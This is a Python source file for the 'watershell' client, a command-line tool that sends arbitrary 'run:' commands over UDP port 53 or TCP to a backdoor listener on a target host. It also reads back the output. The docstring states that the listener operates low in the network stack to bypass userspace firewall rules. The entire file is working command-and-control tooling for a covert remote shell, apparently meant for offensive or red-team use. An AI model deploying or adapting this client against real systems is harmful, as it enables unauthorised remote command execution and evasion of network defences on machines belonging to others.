#!/usr/bin/env python3

"""
Watershell client; a script to easily send commands over UDP to a host running
the watershell listening binary. The watershell will be listening for UDP data
on a lower level of the network stack to bypass userspace firewall rules.

Major update provided by Burrch3s
"""

import argparse
import socket
import time
import sys
import random

def recv_timeout(the_socket, timeout=4):
    """
    Attempt to listen for data until the specified timeout is reached.

    Returns:
        str - Data received over socket
    """
    # make socket non blocking
    the_socket.setblocking(0)

    # total data partwise in an array
    total_data = []
    data = ''

    # beginning time
    begin = time.time()
    while True:
        # if you got some data, then break after timeout
        if total_data and time.time()-begin > timeout:
            break

        # if weve waited longer than the timeout, break
        elif time.time()-begin > timeout:
            break

        # recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data.decode())
                # change the beginning time for measurement
                begin = time.time()
            else:
                # sleep for sometime to indicate a gap
                time.sleep(0.1)
        except BaseException as exc:
            pass

    # join all parts to make final string
    return ''.join(total_data)

def declare_args():
    """
    Function to declare arguments that are acceptable to watershel-cli.py
    """
    parser = argparse.ArgumentParser(
        description="Watershell client to send command to host with watershell listening over UDP.")
    parser.add_argument(
        '-t', '--target',
        dest='target',
        type=str,
        required=True,
        help="IP of the target to send UDP message to.")

    parser.add_argument(
        '-T', '--tcp',
        dest='tcp_bool',
        action='store_true',
        required=False,
        help="Use TCP or default to UDP. (experimental)")

    parser.add_argument(
        '-p', '--port',
        dest='port',
        type=int,
        default=53,
        help="Port to send UDP message to.")

    parser.add_argument(
        '-c', '--command',
        dest='command',
        type=str,
        help="One off command to send to listening watershell target")

    parser.add_argument(
        '-i', '--interactive',
        dest='interactive',
        action='store_true',
        default=True,
        help="Interactively send commands to watershell target")

    return parser

def execute_cmd_prompt(sock, target, tcp_bool):
    """
    Interactively prompt user for commands and execute them
    """
    if tcp_bool:
        sock.connect(target)

    while True:
        cmd = input("//\\\\watershell//\\\\>> ")
        if cmd == 'exit':
            break
        if len(cmd) > 1:
            if not tcp_bool:
                sock.sendto(("run:"+cmd).encode(), target)
                resp = recv_timeout(sock, 4)
                print(resp)
            else:
                sock.send(("run:"+cmd).encode())

def main():
    """
    Entry point to watershell-cli.py. Parse arguments supplied by user,
    grab the status of the watershell target and then issue commands.
    """
    args = declare_args().parse_args()


    # Bind source port to send UDP message from
    # tcp has no response.
    if not args.tcp_bool:
        src_port = random.randint(40000, 65353)
        s_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s_socket.bind(("0.0.0.0", src_port))
    else:
        s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    target = (args.target, args.port)
    print("Connecting to Watershell on {}...".format(target))
    if not args.tcp_bool:
        s_socket.sendto(b'status:', target)

        resp = recv_timeout(s_socket, 2)
        if resp == "up":
            print("Connected!")
        else:
            print("Connection Failed...")
            sys.exit(1)

    if args.interactive and not args.command:
        execute_cmd_prompt(s_socket, target, args.tcp_bool)
    else:
        if not args.tcp_bool:
            s_socket.sendto(("run:{}".format(args.command)).encode(), target)
            resp = recv_timeout(s_socket, 4)
            print(resp)
        else:
            s_socket.connect(target)
            s_socket.send(("run:{}".format(args.command)).encode())


if __name__ == '__main__':
    main()
